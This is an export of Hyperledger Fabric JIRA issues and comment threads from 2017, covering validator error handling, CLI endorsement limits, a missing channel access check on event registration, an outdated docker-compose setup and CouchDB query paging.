 ",,angelo.decaro,C0rWin,denyeart,harrijk,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzx2e7:",,,,,,,,,,,,,,,,,,,,,,,angelo.decaro,C0rWin,denyeart,harrijk,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Jul/17 7:22 PM;denyeart;It looks like there was a TODO in the validator code to revisit errors and invalidations, see [https://gerrit.hyperledger.org/r/#/c/3703/.]

[~C0rWin] [~muralisr] can you take a look?;;;","18/Jul/17 8:04 PM;denyeart;[~adc] [~ales] Artem mentioned you have been working on txvalidator more recently, can you take a look?;;;","20/Jul/17 4:04 PM;angelo.decaro;If the peer panics then, at restart, will it be able to pick up from where it was at the validation process?;;;","21/Jul/17 7:56 AM;C0rWin;[~angelo.decaro] yes, once peer will fail to commit it will panic, later it will sync up with other peer and should be able to continue.;;;","21/Jul/17 7:56 AM;C0rWin;https://gerrit.hyperledger.org/r/#/c/11753/;;;","21/Jul/17 10:21 AM;angelo.decaro;[~C0rWin], thanks, got it. Now, when the peer panic, will it also crash? If yes, then I'm wondering that an adversary will be able to leverage this to make peers crashing and block the network. ;;;","21/Jul/17 10:20 PM;C0rWin;[~angelo.decaro] for adversary to take advantage of this, means he already took down either file system or database, hence peer panic is least concern here, IMO.;;;","22/Jul/17 6:42 PM;angelo.decaro;I agree with you but I don't see from your change-set how you distinguish between the errors. If the peer always crashes for any error then we have a problem. But, I think at this point we are on the same page, right? :);;;","22/Jul/17 7:06 PM;C0rWin;Let me try to show you :)

At this point I've distinguish two possible case of external failure which might lead to inconsistency of the state:

1. You failed to query DB LSCC for VSCC info, due to connectivity issue with DB
2. You failed to invoke VSCC.

The way I've made it is to define error to clearly state the problem:

{code}
// VSCCInfoLookupFailureError error to indicate inability
// to obtain VSCC information from LCCC
type VSCCInfoLookupFailureError struct {
	reason string
}

// Error returns reasons which lead to the failure
func (e VSCCInfoLookupFailureError) Error() string {
	return e.reason
}

// VSCCEndorsementPolicyError error to mark transaction
// failed endrosement policy check
type VSCCEndorsementPolicyError struct {
	reason string
}

// Error returns reasons which lead to the failure
func (e VSCCEndorsementPolicyError) Error() string {
	return e.reason
}

// VSCCExecutionFailureError error to indicate
// failure during attempt of executing VSCC
// endorsement policy check
type VSCCExecutionFailureError struct {
	reason string
}

// Error returns reasons which lead to the failure
func (e VSCCExecutionFailureError) Error() string {
	return e.reason
}
{code}


Next in the method which seeks for VSCC info I've added:

{code}
	bytes, err := qe.GetState(""lscc"", ccid)
	if err != nil {
		return nil, &VSCCInfoLookupFailureError{fmt.Sprintf(""Could not retrieve state for chaincode %s, error %s"", ccid, err)}
	}
{code}

Now if validation returns any of these errors, I'm stopping iterating over transactions and existing with error, stopping commit.

{code}
					// Validate tx with vscc and policy
					logger.Debug(""Validating transaction vscc tx validate"")
					err, cde := v.vscc.VSCCValidateTx(payload, d, env)
					if err != nil {
						txID := txID
						logger.Errorf(""VSCCValidateTx for transaction txId = %s returned error %s"", txID, err)
						switch err.(type) {
						case *VSCCExecutionFailureError:
							return err
						case *VSCCInfoLookupFailureError:
							return err
						default:
							txsfltr.SetFlag(tIdx, cde)
							continue
						}
					}
{code};;;","22/Jul/17 7:06 PM;C0rWin;Hope it makes it clear now.;;;","22/Jul/17 7:17 PM;angelo.decaro;Cool, that helped and I must say it was clear from the code. So, I guess, I'm missing the part where the peer crashes on certain errors. Does it crash?;;;","22/Jul/17 7:19 PM;angelo.decaro;But for 
```
bytes, err := qe.GetState(""lscc"", ccid)
```
What happens if the GetState fails because the ccid was not valid?;;;","23/Jul/17 12:32 AM;C0rWin;I assumed that error returns in case of failure, in case of invalid ccid, there will be nil slice of bytes.

But really thanks for your observation [~angelo.decaro], I will double check it again, now.;;;","26/Jul/17 9:47 AM;angelo.decaro;[~C0rWin], please, may you clarify what happens if the VSCC fails? My understanding is that the peer will panic (and then exit?). Is this correct?;;;","26/Jul/17 1:46 PM;C0rWin;[~angelo.decaro] only if you failed to invoke it, while if VSCC check fails it will mark transaction as invalid.;;;","26/Jul/17 2:11 PM;angelo.decaro;[~C0rWin], in validator.go, line 623, I see the following code:

{code}
res, _, err := v.ccprovider.ExecuteChaincode(ctxt, cccid, args)
	if err != nil {
		msg := fmt.Sprintf(""Invoke VSCC failed for transaction txid=%s, error %s"", txid, err)
		logger.Errorf(msg)
		return &VSCCExecutionFailureError{msg}
	}
{code}

How do you distinguish from a failure of the invocation and the failure of VSCC itself? Now, because VSCCExecutionFailureError is returned, the transaction will not just be marked invalid (validator.go, line 208, btw test coverage does not touch that line), no?

Sorry to continuing insisting. I fear that an attacker can just crash all the peers in a channel in one shot :(;;;","26/Jul/17 3:56 PM;C0rWin;[~angelo.decaro] error returned from execution of VSCC signals of a failure, while state of the result provides information regarding whenever the validation was successful or not, please see few lines below:

{code}
	if res.Status != shim.OK {
		logger.Errorf(""VSCC check failed for transaction txid=%s, error %s"", txid, res.Message)
		return &VSCCEndorsementPolicyError{fmt.Sprintf(""%s"", res.Message)}
	}
{code};;;","26/Jul/17 4:20 PM;angelo.decaro;Yeah, Yeah, I have just reached the same conclusion. Perfect, we are safe :);;;","26/Jul/17 4:26 PM;C0rWin;[~angelo.decaro] thanks for reviewing thoroughly my CR.;;;","26/Jul/17 4:46 PM;angelo.decaro;I'm just paranoid, sorry :(;;;",,,,,,,,,,,,,,,,,,,
"Cannot invoke from CLI when Endorsement Policy is set to ""AND ('Orgx.member', 'Orgz.member')""",FAB-5354,19320,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,rishabh1102,rishabh1102,18/Jul/17 8:18 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,08/Sep/17 3:40 AM,,,,,,fabric-peer,,,,,,0,endorsement,peer,,,,,"While trying to invoke the chaincode after instantiation, when there are multiple organisations in the network (Blockchain network), CLI (peer binary) cannot be used to invoke the code when the endorsement policy is set to ""AND"".

Eg1: AND ('Org0.member', 'Org1.member') fails to invoke from peers of either org.

As per my information, networks with AND endorsement policies can only be invoked through the SDKs.",,angelo.decaro,muralisr,rishabh1102,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"18/Jul/17 8:16 PM;rishabh1102;error_peer0.org0.log;https://jira.hyperledger.org/secure/attachment/11697/error_peer0.org0.log","18/Jul/17 8:16 PM;rishabh1102;error_peer0.org1.log;https://jira.hyperledger.org/secure/attachment/11698/error_peer0.org1.log",,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy8q7:",,,,,,,,,,,,,,,,,,,,,,,angelo.decaro,muralisr,rishabh1102,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"18/Jul/17 8:19 PM;yacovm;[~ales] [~adc] [~muralisr] ;;;","18/Jul/17 11:48 PM;muralisr;[~rishabh1102] CLI does not support sending proposals to multiple peers (yet). A policy that requires multiple signatures is bound to fail from CLI.;;;","19/Jul/17 9:26 AM;angelo.decaro;Yeah, the CLI is pretty limited at this point. Also the transient field cannot be set. Actually, I have some code that improve the CLI to set also that field. Shall I push?;;;","08/Sep/17 3:40 AM;muralisr;[~rishabh1102] This working as designed with the limited CLI support. SDK has better support for multiple endorsements. Closing this one.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Channel ACL is missing while registering/sending events via event hub,FAB-5355,19322,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,angelo.decaro,Senthil1,Senthil1,18/Jul/17 9:10 PM,21/Jul/18 3:57 AM,28/Oct/23 3:00 AM,14/Mar/18 8:31 PM,,,,,,fabric-crypto,,,,,,0,security,"Security,",,,,,"During event registration (block, chaincode, and rejection events), we are only checking whether the event registration message is properly signed by an identity from the same organization as the peer. As a result, one identity can receive block events (including block data which excludes read/write set) from all channels on the peer. 

The following properties are required:
 1. event consumer should give interested channel name along with the interested events during registration. (like we do for invoking qscc: peer chaincode query -C """" -n qscc -c '\{""Args"":[""GetTransactionByID"",""mychannel"",""txid""]}' 
 2. event producer should perform channel ACL before accepting the registration request.
 3. while sending the events to consumer, need to check channel id and make appropriate decision.",,angelo.decaro,denyeart,elli-androulaki,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy8rr:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,angelo.decaro,denyeart,elli-androulaki,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"18/Jul/17 9:17 PM;denyeart;[~adc] Is this a legitimate security issue?;;;","19/Jul/17 9:23 AM;angelo.decaro;[~denyeart], yes, it is. We were all aware of that and was decided lo leave it like that for v1. For v1.1, that will be definitely improved access control.;;;","14/Mar/18 8:31 PM;elli-androulaki;I think this is taken care of with the new event infrastructure. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Can no longer reach localhost:7050/chain,FAB-5356,19324,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,jordan.k.miles,jordan.k.miles,18/Jul/17 11:04 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,07/Aug/17 5:20 PM,,,,Not a Bug,,fabric-peer,,,,,,0,,,,,,,"{code:java}

membersrvc:
    image: hyperledger/fabric-membersrvc
    ports:
    - ""7054:7054""
    command: membersrvc
  vp0:
    image: hyperledger/fabric-peer:x86_64-1.0.0
    ports:
      - ""7050:7050""
      - ""7051:7051""
      - ""7053:7053""
    environment:
      - CORE_PEER_ID=vp0
      - CORE_SECURITY_ENROLLID=test_vp0
      - CORE_SECURITY_ENROLLSECRET=MwYpmSRjupbT
      - CORE_PEER_ADDRESSAUTODETECT=true
      - CORE_VM_ENDPOINT=unix:///var/run/docker.sock
      - CORE_LOGGING_LEVEL=DEBUG
      - CORE_PEER_PKI_ECA_PADDR=membersrvc:7054
      - CORE_PEER_PKI_TCA_PADDR=membersrvc:7054
      - CORE_PEER_PKI_TLSCA_PADDR=membersrvc:7054
      - CORE_SECURITY_ENABLED=false
    links:
      - membersrvc
    command: sh -c ""sleep 5; peer node start --peer-chaincodedev""
{code}
Using the above docker-compose-yaml, I can no longer GET localhost:7050/chain or POST localhost:7050/chaincode. I'm wondering if this is a known issue with an update or if it might be something with my OS. This was working about a week ago and nothing has changed in my configuration to my knowledge. I reinstalled all the images, tried mapping 7050 to a different port, etc. but nothing happens. I get no messages from the server when I try to hit that location, and the only thing I get from the Postman side is ""Socket hangup"". Any help would be greatly appreciated. 

As a side note, I have to use hyperledger/fabric-peer:x86_64-1.0.0, as hyperledger/fabric-peer:latest no longer exists in Docker.",,jordan.k.miles,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy8s7:",,,,,,,,,,,,,,,,,,,,,,,jordan.k.miles,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/Aug/17 5:19 PM;mastersingh24;[~jordan.k.miles] - Looks like you were actually running Hyperledger Fabric v0.6 which no longer exists.  Hyperledger Fabric v1.0.0 was released in July and has a different architecture then v0.6 (including entirely different endpoints).  v0.6 is no longer actively maintainer nor supported within the Hyperledger Fabric community so the images were actually removed from Dockerhub.

Not sure what stage you are in, but here's a link to the latest docs:   [http://hyperledger-fabric.readthedocs.io/en/latest/]

Please note that there's a whole new ""Getting Started"" section, updated examples, etc;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Peer CLI ""channels list"" command should output to stdout",FAB-5357,19325,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,wlahti,jmcnevin,jmcnevin,18/Jul/17 11:11 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,20/Sep/17 7:02 AM,v1.0.0,,,,,fabric-peer,,,,,,0,,,,,,,"Currently, this command does not output the channels list to stdout, so the output cannot be easily piped to other commands/files/etc.",,jmcnevin,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy8sf:",,,,,,,,,,,,,,,,,,,,,,,jmcnevin,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"14/Sep/17 5:24 AM;wlahti;https://gerrit.hyperledger.org/r/#/c/13441/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
update link in Google Analytics for docs,FAB-5358,19326,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ryjones,SarahMills,SarahMills,18/Jul/17 11:26 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,28/Nov/17 7:27 AM,,,,,,fabric-docs,,,,,,0,Documentation,,,,,,"Google analytics account is linked to:

[http://hyperledger-fabric-docs.readthedocs.io/en/latest/]

needs to be removed and added to this domain:

[http://hyperledger-fabric.readthedocs.io/en/latest/]

cc: [~seanbarclay]",,markparz,ryjones,SarahMills,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy8sn:",,,,,,,,,,,,,,,,,,,,,,,markparz,ryjones,SarahMills,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Oct/17 1:17 AM;markparz;[~ryjones] think this one is something you have the access for...;;;","28/Nov/17 7:27 AM;ryjones;code UA-99900088-8 is the correct one for the page you're looking at. I removed the code from h-f-d, but h-f was already using -8, so look there.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add BroadcastResponse info proto field,FAB-5359,19327,18070,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,18/Jul/17 11:55 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,04/Aug/17 12:25 AM,,,,v1.1.0,,fabric-orderer,,,,,,0,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy8sv:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"19/Jul/17 5:25 AM;jyellick;https://jira.hyperledger.org/browse/FAB-5359;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Populate BroadcastResponse info field,FAB-5360,19328,18070,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,18/Jul/17 11:55 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,04/Aug/17 12:24 AM,,,,v1.1.0,,fabric-orderer,,,,,,0,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy8t3:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"19/Jul/17 5:25 AM;jyellick;https://gerrit.hyperledger.org/r/#/c/11731/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Properly return FORBIDDEN on signature validation failure,FAB-5361,19329,18070,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,18/Jul/17 11:56 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,06/Aug/17 6:18 AM,,,,v1.1.0,,fabric-orderer,,,,,,0,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy8tb:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"26/Jul/17 1:04 PM;jyellick;In review via https://gerrit.hyperledger.org/r/#/c/11925/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Behave test framework does not handle uppercase and mixchars in chaincode names ,FAB-5362,19330,19362,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,latitiah,Nishi,Nishi,19/Jul/17 12:02 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,19/Aug/17 12:43 AM,,,,,,fabric-quality,,,,,,0,,,,,,,"During deployment when behave tests are passed uppercase and mixchar names for chaincode names is tests fail.
 
{code:java}
 When a user deploys chaincode at path ""github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02"" with [""init"",""a"",""1000"",""b"",""2000""] with name ""MYCC""{code}


{code:java}
 When a user deploys chaincode at path ""github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02"" with [""init"",""a"",""1000"",""b"",""2000""] with name ""MYcc_Test""{code}


commit level:
Behave Fmwk: *d95525a64e7903565128d4c25ca522365ef6a926*
Fabric *b5c74cb8838d07f2101652a1c0acbb3b033a7660*{code}",,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy8tj:",,,,,,Sprint 19 - Quality,,,,,3.0,,,,,,,,,,,,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PTE sends transaction to multiple peers,FAB-5364,19332,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wsh_bob,dongming,dongming,19/Jul/17 12:42 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,03/Aug/17 11:12 PM,,,,,,fabric-quality,,,,,,0,quality,,,,,,PTE sends transactions to the peers listed in the user input json.  ,,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-2247,,,,,,,,,"1|hzy8tz:",,,,,,,,,,,,,,,,,,,,,,,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Peer CLI deliver always returns the same (incorrect) string for error,FAB-5365,19333,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,19/Jul/17 1:50 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,19/Jul/17 10:51 PM,,,,v1.0.1,,fabric-peer,,,,,,0,,,,,,,"On deliver failure, the peer always outputs a message which looks like:


{noformat}
Got status:*orderer.DeliverResponse
{noformat}

because the print statement is actually printing the type of the message, not the content.",,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy8u7:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"19/Jul/17 5:45 AM;jyellick;https://gerrit.hyperledger.org/r/#/c/11733/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Time out while starting chain code in e2e test,FAB-5367,19335,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,jamesgua,jamesgua,19/Jul/17 4:33 AM,23/Jan/20 6:54 AM,28/Oct/23 3:00 AM,23/Jan/20 6:54 AM,v1.0.0,,,,,fabric-samples,,,,,,0,stale-item,v1.0,,,,,"Running e2e test script under examples/e2e_cli
./network_setup.sh up $CHANNEL
even after successful run, it may (not always but quite often) still hang at

""instantiateChaincode 2"", it is annoying since it doesn't happen every time, even if I add a sleeping period before the line (say ""sleep 5"")","Ubuntu 16.04.2 LTS (Xenial Xerus)

Linux version 4.4.0-75-generic (buildd@lgw01-21) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #96-Ubuntu SMP Thu Apr 20 09:56:33 UTC 2017",jamesgua,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Jul/17 4:32 AM;jamesgua;e2e.log;https://jira.hyperledger.org/secure/attachment/11701/e2e.log",,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy8un:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,jamesgua,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"20/Jul/17 1:30 AM;jamesgua;Solutions found: remove docker images those started with ""peer"" and re-run the test, then it will succeed.;;;","23/Jan/20 6:54 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
No means to get channel config bytes for update.,FAB-5368,19337,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,rickr,rickr,rickr,19/Jul/17 5:42 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,25/Jul/17 4:40 AM,v1.0.1,,,v1.0.1,,,,,,,,0,,,,,,,"In fabric sdk java currently there in no method to retrieve channel configuration bytes.

There is a method getConfigurationBlock() method in Channel class. However this method is marked private. The getConfigurationBlock() method  returns a Block(org.hyperledger.fabric.protos.common.Common$Block). However some tools like the configtxlator take as input the configuration block in .pb (protobuf) format. Hence we need a way to retrieve the configuration block in .pb format",,rhegde,rickr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy8uv:",,,,,,,,,,,,,,,,,,,,,,,rhegde,rickr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dev,main,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Peer overwrites limit/skip fields in CouchDB query string,FAB-5369,19338,,Story,Closed,FAB,Fabric,software,denyeart,,,Highest,Done,,sstone1,sstone1,19/Jul/17 6:10 AM,21/Jul/18 3:56 AM,28/Oct/23 3:00 AM,11/Mar/18 11:13 PM,v1.0.0,,,Future,,fabric-ledger,,,,,,3,Ledger,,,,,,"If I pass in a CouchDB query string that specifies either `limit` or `skip`, then the query results are not as I would expect.

It seems that the peer has some code in it that forcibly sets `limit` to a configuration value from `core.yaml`, and forcibly sets `skip` to 0. It does this without checking whether `limit` or `skip` are already specified by the user in the query string.

This is the query string that we send in:
{code:java}
{""selector"":{""$class"":""systest.queries.SampleAsset"",""$registryType"":""Asset"",""$registryId"":""systest.queries.SampleAsset""},""limit"":2}{code}
This is the output of the peer rewriting the query:
{code:java}
[statecouchdb] ApplyQueryWrapper -> DEBU 1f62 Rewritten query with data wrapper: {""limit"":10000,""selector"":{""$and"":[\{""chaincodeid"":""systest-queries""},\{""data.$class"":""systest.queries.SampleAsset"",""data.$registryId"":""systest.queries.SampleAsset"",""data.$registryType"":""Asset""}]},""skip"":0}{code}
This is the offending code:

[https://github.com/hyperledger/fabric/blob/d9c320297bd2a4eff2eb253ce84dc431ef860972/core/ledger/kvledger/txmgmt/statedb/statecouchdb/query_wrapper.go#L101]

IMHO the code should check for existing `limit` or `skip` values before overwriting them ;)",,chenxuan,cotofei,davidkel,denyeart,dselman,luomin,mastersingh24,ssaddem,sstone1,xuanyue202,ynamiki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-2809,,FAB-2809,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy8v3:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,chenxuan,cotofei,davidkel,denyeart,dselman,luomin,mastersingh24,ssaddem,sstone1,xuanyue202,ynamiki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Jul/17 5:13 PM;chenxuan;i meet the same question.;;;","19/Jul/17 11:00 PM;ssaddem;I suggest to replace in [core/ledger/kvledger/txmgmt/statedb/statecouchdb/query_wrapper.go|https://github.com/hyperledger/fabric/blob/master/core/ledger/kvledger/txmgmt/statedb/statecouchdb/query_wrapper.go#L101]

//Add limit
 jsonQueryMap[jsonQueryLimit] = queryLimit

//Add skip
 jsonQueryMap[jsonQuerySkip] = querySkip

 

with 

 

if _, ok := jsonQueryMap[jsonQueryLimit]; !ok \{
 jsonQueryMap[jsonQueryLimit] = queryLimit
 }
 if _, ok := jsonQueryMap[jsonQueryLimit]; !ok \{
 jsonQueryMap[jsonQuerySkip] = querySkip
 }

and in method signature wil be:
 func ApplyQueryWrapper(namespace, queryString string, *defaultLimit int*) (string, error)

 

P.S : Must verify that jsonQueryMap[jsonQueryLimit] and  jsonQueryMap[jsonQueryLimit] contains int
 Regards

 ;;;","20/Jul/17 12:03 AM;denyeart;W{color:#444444}e did intend to revisit how 'paging' works, balancing function, performance, and mitigation of malicious user requests. FAB-2809 is part of that. We'll also consider FAB-5369 during the assessment. 
{color};;;","03/Aug/17 10:47 PM;davidkel;We are getting lots of people asking about this issue and when it will be fixed so I have changed it to highest.;;;","04/Sep/17 10:00 PM;mastersingh24;[~denyeart] I'm changing this to improvement as this is working as designed I believe?;;;","05/Sep/17 8:59 PM;denyeart;[~mastersingh24] I agree this is an improvement rather than bug.

I have added more description to FAB-2809 where CouchDB pagination support will be added, to include more context of the limitation and proposed solution.  In fact, I will mark this item as a duplicate of FAB-2809.  I'd encourage all the watchers of this item to review FAB-2809 description and provide their comments there. [~sstone1] [~davidkel] [~chenxuan].

 ;;;","04/Oct/17 4:16 AM;sstone1;Just to back up what Dave said - this is a real pain for Composer users. It comes up without fail at least once a week, if not more. Composer users want to be able to build apps that page through large result sets (perhaps lists of assets matching a given query), and they can't do that at the moment. Their only option is to mirror the Blockchain data into an external database and build an app which queries that instead.

Will leave the same comment in FAB-2809.;;;","11/Mar/18 11:13 PM;denyeart;Closing this one - will track under FAB-2809 as High Priority.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Pluggable system chaincode (ESCC, VSCC, etc) should have explicitly defined interfaces and be implemented as system plugins rather than generic chaincode",FAB-5378,19351,,Story,Closed,FAB,Fabric,software,denyeart,,,High,Done,yacovm,mastersingh24,mastersingh24,19/Jul/17 6:49 PM,21/Jul/18 3:56 AM,28/Oct/23 3:00 AM,12/Aug/17 10:37 PM,v1.0.0,,,v1.1.0,,fabric-peer,,,,,,0,,,,,,,"The original concept of system chaincode (SCC) was to enable to running  chaincode in process and from that perspective it made sense to use the same generic chaincode interface for both user and system chaincode.

